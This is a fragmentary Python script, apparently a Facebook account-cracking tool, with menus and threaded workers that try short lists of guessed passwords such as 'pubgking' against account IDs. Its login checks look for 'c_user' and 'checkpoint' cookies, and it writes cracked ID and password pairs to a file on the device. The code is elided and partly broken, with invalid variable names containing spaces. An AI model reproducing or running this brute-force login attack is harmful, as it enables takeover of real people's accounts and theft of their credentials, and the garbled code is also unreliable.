...
try:
	...
	os.system('python Joyiabrand.py')
ugen = []
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> Balawal Saleem  VERSION :\x1b[1;92m 2.6 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/Balawal.txt')
				linex()
				...
				os.system('python Joyia.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
			elif xd in ['4','04']:
				os.system(f'xdg-openhttps://www.facebook.com/balawal.saleem.3');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Balawal/ Saleem] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in Balawa Saleem:
				print('\r\r\033[1;31m[Balawal-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/Balawal-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Balawal Saleem:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Balawal-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Balawal / Saleem] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Balawal-CP] '+ids+' | '+pas+'\033[1;97m')
...
def random_number2():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = ['pubgking','pubgking12335','khankhan123','PUBGKing','pubgkhan123456']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mNOMI / NAZIR\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Balawal-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Balawal-OK] '+cid+' | '+ps+'\33[0;97m')
